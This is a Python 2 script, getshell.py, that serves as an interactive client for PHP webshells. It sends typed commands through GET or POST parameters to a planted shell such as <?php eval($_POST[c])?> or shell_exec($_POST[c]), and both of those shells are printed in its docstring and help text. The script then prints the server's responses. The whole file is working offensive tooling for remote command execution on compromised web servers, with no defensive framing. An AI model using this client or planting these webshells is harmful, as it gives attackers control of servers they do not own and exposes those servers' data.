#!/usr/bin/python
#coding=utf-8
'''
descriptions:
	A webshell linker for two type php function :
		php  --phpcode function 	Forexample: <?php eval($_POST[c])?>
	  	bash --bashcode function 	Forexample: <?php echo shell_exec($_POST[c])?>

'''
import requests
import sys
#import os

def show_help():
	print('Usage: python getshell.py http://127.0.0.1/shell.php  POST  c')
	print('Input:')
	print('	quit | q 	to quit()')
	print('	set 		to set URL,Method,Password')
	print('	back |b 	to back ')
	print('	help  		for help')
	print('	sheel_func type:')
	print('			php  --phpcode function 	Forexample: <?php eval($_POST[c])?>')
	print('  			bash --bashcode function 	Forexample: <?php echo shell_exec($_POST[c])?>')


def bash_shell(request):
	url=request['url']
	method=request['method']
	password=request['password']
	if method=='POST':
		while True:
			str = raw_input("bash$")
			if str=='quit' or str=='q':
				exit(1)
			elif str=='back' or str=='b':
				break
			data={password:str}
	 		r= requests.post(url,data=data)
			print r.content

	if method=='GET':
		while True:
			str =raw_input("bash$")
			if str=='quit' or str=='q':
				exit(1)
			elif str=='back' or str=='b':
				break
			newurl=url+'?'+password+'='+str
			r  =requests.get(newurl)
			print r.content

def php_shell(request):
	url=request['url']
	method=request['method']
	password=request['password']
	if method=='POST':
		while True:
			str = raw_input("php$")
			if str=='quit' or str=='q':
				exit(1)
			elif str=='back' or str=='b':
				break
			cmd='echo `'+str+'`;'
			data={password:cmd}
	 		r= requests.post(url,data=data)
			print r.content

	if method=='GET':
		while True:
			str =raw_input("php$")
			if str=='quit' or str=='q':
				exit(1)
			elif str=='back' or str=='b':
				break
			cmd='echo `'+str+'`;'
			newurl=url+'?'+password+'='+cmd
			r  =requests.get(newurl)
			print r.content
def python_shell():
	return

def set(request):
	print('')
	url=request['url']
	method=request['method']
	password=request['password']
	print('SET:')
	newurl=raw_input('url=>')
	url=url if newurl=='' else newurl
	newmethod=raw_input('method=>')
	method=method if newmethod=='' else newmethod
	newpass=raw_input('newpass=>')
	password=password if newpass =='' else newpass
	request={'url':url,'method':method,'password':password}
	return request




def main():
	#if sys.argv[1]=='-h' or sys.argv[1]=='--help':
	#	show_help()

	if len(sys.argv)!=4:
		show_help()
		exit(1)

	url = sys.argv[1]
	method = sys.argv[2]
	password = sys.argv[3]
	request={'url':url,'method':method,'password':password}
	'''
	print('input shell_func type:')
	print('	php  --phpcode function 	Forexample: <?php eval($_POST[c])?>')
	print('	bash --bashcode function 	Forexample: <?php echo shell_exec()?>')
	'''
	while True:
		print('')
		type=raw_input('$')
		if type=='php':
			php_shell(request)
		elif type =='bash':
			bash_shell(request)
		elif type=='shell':
			python_shell()
		elif type=='help':
			show_help()
		elif type=='set':
			request=set(request)
		elif type=='quit'or type=='q':
			exit(1)
		else:
			print('Input Error!	Quiting...')
			exit(1)
	
main()

	
